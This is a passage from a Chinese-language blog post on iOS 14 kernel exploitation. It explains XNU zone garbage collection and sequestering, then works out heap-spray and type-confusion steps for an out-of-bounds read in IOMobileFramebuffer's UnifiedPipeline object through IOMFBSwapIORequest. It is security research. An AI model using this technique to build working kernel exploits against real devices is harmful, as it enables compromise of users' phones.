<h2 id="zone垃圾收集和封存"><a href="#zone垃圾收集和封存" class="headerlink" title="zone垃圾收集和封存"></a>zone垃圾收集和封存</h2><p>所有zone都有一个chunk size，表示一个虚拟内存连续的区域能被分割成多少个页。这个范围被称为 “chunk”。像<code>*.kalloc.192</code>这样较小的区域，其块的大小为一页。但是对于较大的区域，比如<code>*.kalloc.6144</code>，块的大小就会增加到2页，这是16k页面大小的设备的最大值。对于4k页面大小的设备，最大的块大小是8页。</p>
<p>与区块中每个页面相关的结构是<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/zalloc.c#L159">struct zone_page_metadata</a>:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">zone_page_metadata</span> &#123;</span><br><span class="line">	<span class="comment">/* 该元数据页所属区域的索引 */</span></span><br><span class="line">	<span class="type">zone_id_t</span>       zm_index : <span class="number">11</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Whether `zm_bitmap` is an inline bitmap or a packed bitmap reference */</span></span><br><span class="line">	<span class="type">uint16_t</span>        zm_inline_bitmap : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * zone以zone_t::z_chunk_pages的&quot;chunk&quot;为单位进行分配</span></span><br><span class="line"><span class="comment">	 * 如果zone是percpu，则以zpercpu_count()页为单位</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * The first page of it has its metadata set with:</span></span><br><span class="line"><span class="comment">	 * - 0 if none of the pages are currently wired</span></span><br><span class="line"><span class="comment">	 * - the number of wired pages in the chunk (not scaled for percpu).</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Other pages in the chunk have their zm_chunk_len set to</span></span><br><span class="line"><span class="comment">	 * ZM_SECONDARY_PAGE or ZM_SECONDARY_PCPU_PAGE depending on whether</span></span><br><span class="line"><span class="comment">	 * the zone is percpu or not. For those, zm_page_index holds the</span></span><br><span class="line"><span class="comment">	 * index of that page in the run.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">uint16_t</span>        zm_chunk_len : <span class="number">4</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZM_CHUNK_LEN_MAX        0x8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZM_SECONDARY_PAGE       0xe</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZM_SECONDARY_PCPU_PAGE  0xf</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZM_ALLOC_SIZE_LOCK      1u</span></span><br><span class="line">		<span class="type">uint16_t</span> zm_alloc_size; <span class="comment">/* first page only */</span></span><br><span class="line">		<span class="type">uint16_t</span> zm_page_index; <span class="comment">/* secondary pages only */</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="type">uint32_t</span> zm_bitmap;     <span class="comment">/* most zones */</span></span><br><span class="line">		<span class="type">uint32_t</span> zm_bump;       <span class="comment">/* permanent zones */</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="type">zone_pva_t</span>      zm_page_next;</span><br><span class="line">	<span class="type">zone_pva_t</span>      zm_page_prev;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>如果一个zone page metadata结构与一个块中的第一页相关联，zm_chunk_len是zm_index（XNU的zone_array中的索引）所指的区域的块大小。如果块的大小超过一页，那么对于第二页及以后，zm_chunk_len被定义为ZM_SECONDARY_PAGE或ZM_SECONDARY_PAGE_PCPU_PAGE，并且zm_page_index作为该块的索引。否则，zm_alloc_size告诉我们该块中目前有多少字节被分配。zm_page_next和zm_page_prev一起工作，为zm_index的zone形成一个块的队列。如果一个zone的zone page metadata结构是这个大块队列的头，那么zm_page_prev持有一个由zone_queue_encode编码的值。如果它不是头部，两者都指向前一个&#x2F;下一个分块的第一页，但只有当它们所属的zone page metadata结构与分块中的第一页相关联时，才会如此。</p>
<p>所有的zone结构都带有指向zone page metadata结构的指针，每个指针都有不同的作用。在iOS 13及以下版本中，这些指针被称为all_free、intermediate和all_used。all_free维护一个只有自由元素的块队列，intermediate维护一个既有自由元素又有使用元素的块队列，而all_used维护一个只有使用元素的块队列。在iOS 14及以上版本中，它们分别被重新命名为empty、partial和full，但它们的用途保持不变。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/zalloc_internal.h#L234">zone</a>结构如下:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">zone</span> &#123;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">zone_pva_t</span>          z_pageq_empty;  <span class="comment">/* populated, completely empty pages   */</span></span><br><span class="line">    <span class="type">zone_pva_t</span>          z_pageq_partial;<span class="comment">/* populated, partially filled pages   */</span></span><br><span class="line">    <span class="type">zone_pva_t</span>          z_pageq_full;   <span class="comment">/* populated, completely full pages    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/zalloc_internal.h#L114">zone_pva_t</a></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*!</span></span><br><span class="line"><span class="comment"> * @typedef zone_pva_t</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @brief</span></span><br><span class="line"><span class="comment"> * Type used to point to a page virtual address in the zone allocator.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @description</span></span><br><span class="line"><span class="comment"> * - Valid pages have the top bit set.</span></span><br><span class="line"><span class="comment"> * - 0 represents the &quot;NULL&quot; page</span></span><br><span class="line"><span class="comment"> * - non 0 values with the top bit cleared do not represent any valid page.</span></span><br><span class="line"><span class="comment"> *   the zone freelists use this space to encode &quot;queue&quot; addresses.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">zone_packed_virtual_address</span> &#123;</span><br><span class="line">	<span class="type">uint32_t</span> packed_address;</span><br><span class="line">&#125; <span class="type">zone_pva_t</span>;</span><br></pre></td></tr></table></figure>

<p>一个zone打包的虚拟地址实际上只是<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/zalloc_internal.h#L109">内核指针</a>的Bits[49:14]，并有一些特殊的规则:</p>
<ul>
<li>(zone_pva_t)0代表零页（又称NULL）。</li>
<li>zone_pva_t的最高位被设置，可以通过将其移到左边的14位并进行符号扩展来转换回其对应的页对齐的内核指针。</li>
<li>一个zone_pva_t的顶位被清除，代表一个队列地址。</li>
</ul>
<p>这样做的好处是，你可以将一个非队列的zone_pva_t转换回其对应的zone page metadata结构，反之亦然，分别使用zone_pva_to_meta和zone_pva_from_meta。不仅如此，一旦我们有了一个指向zone page metadata结构的指针，我们就可以通过调用zone_meta_to_addr来得出它所关联的块中的页面。例如，<code>zone_pva_to_meta(z-&gt;z_pageq_empty)</code>将返回表示z所指向的区的空队列的头的zone page metadata结构。</p>
<p>属于某个zone的所有块被布置成网格中的盒子，每个盒子代表一个块。从一个块到一个metadata结构的虚线箭头表示这两者之间的联系。假设三个深绿色的块在前面描述的一个队列的中间有背对背的zone_page_metadata条目，我们会有这样的东西。</p>
<p><img src="https://jsherman212.github.io/assets/popping_ios14_with_iomfb/metadata_chunk_relationship.png"></p>
<p><a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/zalloc.c#L6529">zone_gc</a>是zone垃圾收集的入口，它调用zone_reclaim_all，zone_reclaim_all负责在每个zone上调用zone_reclaim，有趣的部分从zone_reclaim的结尾开始:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(;;)&#123;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (zone_pva_is_null(z-&gt;z_pageq_empty)) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  	<span class="comment">// 将只有空闲元素的页面释放回给区域分配器</span></span><br><span class="line">    meta  = zone_pva_to_meta(z-&gt;z_pageq_empty); </span><br><span class="line">    count = (<span class="type">uint32_t</span>)ptoa(meta-&gt;zm_chunk_len) / zone_elem_size(z);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (z-&gt;z_elems_free - count &lt; goal) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    zone_reclaim_chunk(z, meta, count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/zalloc.c#L6173">zone_reclaim_chunk</a>弹出从z-&gt;z_pageq_empty传递给它的zone page metadata:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">zone_reclaim_chunk</span><span class="params">(<span class="type">zone_t</span> z, <span class="keyword">struct</span> zone_page_metadata *meta, <span class="type">uint32_t</span> free_count)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Declaring variables */</span></span><br><span class="line"></span><br><span class="line">    zone_meta_queue_pop_native(z, &amp;z-&gt;z_pageq_empty, &amp;page_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... */</span></span><br></pre></td></tr></table></figure>

<p>在<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/zalloc.c#L6258">zone_reclaim_chunk</a>的结尾:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (sequester) &#123;</span><br><span class="line">    kernel_memory_depopulate(zone_submap(z), page_addr,</span><br><span class="line">        size_to_free, KMA_KOBJECT, VM_KERN_MEMORY_ZONE);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    kmem_free(zone_submap(z), page_addr, ptoa(z-&gt;z_chunk_pages));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样，对于KHEAP_DEFAULT和KHEAP_KEXT来说，sequester将永远是真的。kmem_free释放的是块和支持该块的物理内存，而kernel_memory_depopulate只释放物理内存。在往下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (sequester) &#123;</span><br><span class="line">    zone_meta_queue_push(z, &amp;z-&gt;z_pageq_va, meta);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>刚刚填充的区块的页面元数据被推送到一个叫做z_pageq_va的队列中。这个队列在iOS 14中首次出现，它位于zone结构中z_pageq_full之后。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> &#123;</span></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">zone_pva_t</span>          z_pageq_empty;  <span class="comment">/* populated, completely empty pages   */</span></span><br><span class="line">    <span class="type">zone_pva_t</span>          z_pageq_partial;<span class="comment">/* populated, partially filled pages   */</span></span><br><span class="line">    <span class="type">zone_pva_t</span>          z_pageq_full;   <span class="comment">/* populated, completely full pages    */</span></span><br><span class="line">    <span class="type">zone_pva_t</span>          z_pageq_va;     <span class="comment">/* non-populated VA pages              */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>z_pageq_va将会被 <a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/zalloc.c#L4535"><code>zone_expand_locked()</code></a>函数使用.如果一个zone的空闲元素开始耗尽，这个函数就会被调用来重新填充该zone。它所做的第一件事就是看是否可以重新使用z_pageq_va中的一个被删除的块。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!zone_pva_is_null(z-&gt;z_pageq_va)) &#123;</span><br><span class="line">    meta = zone_meta_queue_pop_native(z,</span><br><span class="line">        &amp;z-&gt;z_pageq_va, &amp;addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (meta-&gt;zm_chunk_len == ZM_SECONDARY_PAGE) &#123;</span><br><span class="line">        cur_pages = meta-&gt;zm_page_index;</span><br><span class="line">        meta -= cur_pages;</span><br><span class="line">        addr -= ptoa(cur_pages);</span><br><span class="line">        zone_meta_lock_in_partial(z, meta, cur_pages);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们把注意力转移到<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/zalloc.c#L4635">zone_expand_locked</a>上，我们会看到XNU试图用vm_page_grab抓取足够的空闲页来满足min_pages，而不是满足zone z的chunk大小。min_pages是z的元素大小，四舍五入到最近的页。这就是后来可能产生部分填充的块的原因，因为这里没有任何东西强制要求为addr所属的块中的每个页面分配一个空闲页。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (pages &lt; z-&gt;z_chunk_pages - cur_pages) &#123;</span><br><span class="line">    <span class="type">vm_page_t</span> m = vm_page_grab();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (m) &#123;</span><br><span class="line">        pages++;</span><br><span class="line">        m-&gt;vmp_snext = page_list;</span><br><span class="line">        page_list = m;</span><br><span class="line">        vm_page_zero_fill(m);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pages &gt;= min_pages &amp;&amp; (vm_pool_low() || waited)) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来，调用kernel_memory_populate_with_pages来重新映射最近被释放的z_pageq_va块的虚拟内存到支持刚刚被分配的自由页的物理内存上。然而，如果XNU不能分配足够的空闲页来满足该块的长度，那么在kernel_memory_populate_with_pages返回后，该块中的一些页将继续被释放，产生一个部分填充的块。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kernel_memory_populate_with_pages(zone_submap(z),</span><br><span class="line">    addr + ptoa(cur_pages), ptoa(pages), page_list,</span><br><span class="line">    zone_kma_flags(z, flags), VM_KERN_MEMORY_ZONE);</span><br></pre></td></tr></table></figure>

<p>最后，<a target="_blank" rel="noopener" href="https://github.com/apple/darwin-xnu/blob/2ff845c2e033bd0ff64b5b6aa6063a1f8f65aa32/osfmk/kern/zalloc.c#L4373">zcram_and_lock</a>被调用。这个函数负责使被重新映射的块再次可用于一个区域。如果这个区块最终被部分填充，它将确保被填充的页面能够回到z_pageq_va中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pg_end &lt; chunk_pages) &#123;</span><br><span class="line">    <span class="comment">/* push any non populated residual VA on z_pageq_va */</span></span><br><span class="line">    zone_meta_queue_push(zone, &amp;zone-&gt;z_pageq_va, meta + pg_end);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ... */</span></span><br></pre></td></tr></table></figure>

<p>总结一下，新的zone垃圾收集zone扩展流程提供了一个真正强有力的保证：因为被封存的页面的虚拟内存实际上并没有释放到zone映射上，所以不可能将这些虚拟内存重新用于其他分区。支持KHEAP_DATA_BUFFERS的区域没有被封存，不同于KHEAP_DEFAULT和KHEAP_KEXT，KHEAP_DATA_BUFFERS单独存在于一个地方。</p>
<h2 id="Pipe管道"><a href="#Pipe管道" class="headerlink" title="Pipe管道"></a>Pipe管道</h2><p>我们可以越界读取一个在kext.kalloc.6144内的、巨大的、0x13a0字节的UnifiedPipeline对象中的内联数组<code>IOSurface*[]</code>，kext.kalloc.6144的内存区域比较稳定，所以对这个区域进行喷射，分配的内存会落在这个UnifiedPipeline对象的周围。由于数组的访问是通过<code>*(UnifiedPipeline + 0xa98 + (0x8 * idx))</code>的形式进行的，因此可以从UnifiedPipeline对象中读出任何指针字段，并对其进行类型混淆。下面是去除内核指针后的字段:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;offset&gt;:&lt;对象类&gt; (&lt;大小&gt;)</span><br><span class="line"><span class="number">0x18</span>: 	<span class="built_in">OSDictionary</span> (<span class="number">0x40</span>)</span><br><span class="line"><span class="number">0x20</span>: 	<span class="built_in">OSDictionary</span> (<span class="number">0x40</span>)</span><br><span class="line"><span class="number">0x30</span>: 	<span class="built_in">AppleARMIODevice</span> (<span class="number">0xd8</span>)</span><br><span class="line"><span class="number">0x60</span>: 	<span class="built_in">IOServicePM</span> (<span class="number">0x288</span>)</span><br><span class="line"><span class="number">0x7f8</span>: 	<span class="built_in">IOSurface</span>  (<span class="number">0x400</span>)</span><br><span class="line"><span class="number">0x810</span>: 	<span class="built_in">IODMACommand</span> (<span class="number">0x78</span>)</span><br><span class="line"><span class="number">0xb28</span>: 	<span class="built_in">IOMFBSwapIORequest</span> (<span class="number">0x640</span>)</span><br><span class="line"><span class="number">0xba8</span>: 	<span class="built_in">IODARTMapper</span> (<span class="number">0x690</span>)</span><br><span class="line"><span class="number">0xbb0</span>: 	<span class="built_in">IOSurfaceRoot</span> (<span class="number">0x1f0</span>)</span><br><span class="line"><span class="number">0xbb8</span>: 	<span class="built_in">IOCommandGate</span> (<span class="number">0x50</span>)</span><br><span class="line"><span class="number">0xbc0</span>: 	<span class="built_in">IOWorkLoop</span> (<span class="number">0x48</span>)</span><br><span class="line"><span class="number">0xbc8</span>: 	<span class="built_in">IOSurface</span> (<span class="number">0x400</span>)</span><br><span class="line"><span class="number">0xbd0</span>: 	<span class="built_in">IOPMServiceInterestNotifier</span> (<span class="number">0x88</span>)</span><br><span class="line"><span class="number">0xbd8</span>: 	<span class="built_in">IOInterruptEventSource</span> (<span class="number">0x68</span>)</span><br><span class="line"><span class="number">0xbe0</span>: 	<span class="built_in">AppleARMIODevice</span> (<span class="number">0xd8</span>)</span><br><span class="line"><span class="number">0xbe8</span>: 	<span class="built_in">IOTimerEventSource</span> (<span class="number">0x60</span>)</span><br><span class="line"><span class="number">0xd30</span>: 	<span class="built_in">IOSurfaceDeviceMemoryRegion</span> (<span class="number">0x60</span>)</span><br><span class="line"><span class="number">0xd40</span>: 	<span class="built_in">IOCommandPool</span> (<span class="number">0x38</span>)</span><br><span class="line"><span class="number">0xd68</span>: 	<span class="built_in">AppleMobileFileIntegrity</span> (<span class="number">0x88</span>)</span><br><span class="line"><span class="number">0x1230</span>: <span class="built_in">VideoInterfaceMipi</span> (<span class="number">0x78</span>)</span><br><span class="line"><span class="number">0x12d8</span>: <span class="built_in">AppleARMBacklight</span> (<span class="number">0x358</span>)</span><br></pre></td></tr></table></figure>

<p>这里要选取大小比IOSurface大的对象，就是IOSurface、IOMFBSwapIORequest和IODARTMapper。POC触发内核Panic的函数是IOSurfaceSendRight::init，IOSurface是其第三个参数，如果使用IOSurface来进行堆喷，则不能造成类型混淆。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IOSurfaceSendRight::<span class="built_in">init</span>(IOSurfaceSendRight *__hidden <span class="keyword">this</span>, IOSurfaceRoot *, IOSurface *)</span><br></pre></td></tr></table></figure>

<p>IODARTMapper不是一个可以从应用程序沙盒中创建的对象，因此，只能选择IOMFBSwapIORequest。</p>
<p>通过对IOMobileFramebufferUserClient进行逆向分析，可以看到有很多包含swap的外部方法:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">External method <span class="number">4</span>: IOMobileFramebufferUserClient::s_swap_start</span><br><span class="line">External method <span class="number">5</span>: IOMobileFramebufferUserClient::s_swap_submit</span><br><span class="line">External method <span class="number">6</span>: IOMobileFramebufferUserClient::s_swap_wait</span><br><span class="line">External method <span class="number">20</span>: IOMobileFramebufferUserClient::s_swap_signal</span><br><span class="line">External method <span class="number">52</span>: IOMobileFramebufferUserClient::s_swap_cancel</span><br><span class="line">External method <span class="number">69</span>: IOMobileFramebufferUserClient::s_swap_set_color_matrix</span><br><span class="line">External method <span class="number">81</span>: IOMobileFramebufferUserClient::s_swap_cancel_all</span><br></pre></td></tr></table></figure>

<p>可以在应用程序沙盒内访问IOMobileFramebufferUserClient，继续分析</p>
<p>外部方法4：调用IOMobileFramebufferUserClient::s_swap_start时，将会进入IOMobileFramebufferLegacy::swap_start。该函数调用 IOMFBSwapIORequest::create 来分配一个新的IOMFBSwapIORequest对象。在一点初始化之后，新创建的swap的 swap ID被计算出来，并作为这个外部方法的唯一输出传回给我们。因此，可以实现从用户空间创建IOMFBSwapIORequests。</p>
<p>但是，我们无法控制IOMobileFramebufferUserClient::s_swap_start对新创建的IOMFBSwapIORequest的初始化操作。</p>
<p>外部方法5：IOMobileFramebufferUserClient::s_swap_submit的输入参数对任何超过0x280字节的大小，都会报错（至少对于14.6和14.7）。</p>
<p>要 “提交 “的IOMFBSwapIORequest的swap ID是通过结构输入而传递的。在调用 IOMobileFramebufferUserClient::s_swap_submit 之后，我们最终会在 UnifiedPipeline::swap_submit 中结束。这是一个大函数，它将我们的大部分结构输入复制到与我们指定的swap ID相对应的IOMFBSwapIORequest对象。结构输入中没有被直接复制到对象中的部分是像IOSurface ID这样的东西。这些ID被用来推导IOSurface指针，这些指针被写入对象中。这个函数的一个有趣之处在于它从结构输入中读取一个用户空间指针，从该指针和当前任务中创建一个IOBufferMemoryDescriptor对象，然后从该内存中复制0x20c字节到IOMFBSwapIORequest对象，从偏移量0x366开始。所以我们真的有0x280+0x20c字节的控制输入。但由于IOMFBSwapIORequest::create将其分配的IOMFBSwapIORequest清零，这些字节仍然为零，这对漏洞利用开发来说并没有什么区别。</p>
<p>类型混淆的第三个要求：在偏移量0xc0处会有一个非空指针，在偏移量0x3f0处会有一个非空（或NULL）指针。首先，让我们检查一下我们是否对这些字节有控制权，因为这意味着我们将能够自己创造这些条件。恼人的是，这个函数是以这样的方式编译的，很难快速地用眼看到我们是否对偏移量0xc0有控制。尽管如此，我们确实控制了这八个字节。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; *(_DWORD *)(found_swap + <span class="number">356</span> + <span class="number">4LL</span> * j); ++k )</span><br><span class="line">&#123;</span><br><span class="line">  v26 = (<span class="type">int</span> *)(input_swap + <span class="number">268</span> + ((__int64)j &lt;&lt; <span class="number">6</span>));</span><br><span class="line">  v27 = v26[<span class="number">4</span> * k + <span class="number">1</span>];</span><br><span class="line">  v28 = v26[<span class="number">4</span> * k + <span class="number">2</span>];</span><br><span class="line">  v29 = v26[<span class="number">4</span> * k + <span class="number">3</span>];</span><br><span class="line">  v30 = (_DWORD *)(found_swap + <span class="number">113</span> + ((__int64)j &lt;&lt; <span class="number">6</span>) + <span class="number">0x10LL</span> * (<span class="type">int</span>)k);</span><br><span class="line">  *v30 = v26[<span class="number">4</span> * k];</span><br><span class="line">  v30[<span class="number">1</span>] = v27;</span><br><span class="line">  v30[<span class="number">2</span>] = v28;</span><br><span class="line">  v30[<span class="number">3</span>] = v29;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>found_swap是我们要提交的IOMFBSwapIORequest，input_swap是我们的结构输入。*(_DWORD *)(found_swap + 356 + 4LL * j)是可控的，但被验证为落在[0, 4]范围内。相反，很容易看到我们也控制了偏移量为0x3f0的8个字节，因为那是0x20c字节区域的一部分，它是由我们在结构输入上提供的用户空间指针复制过来的。</p>
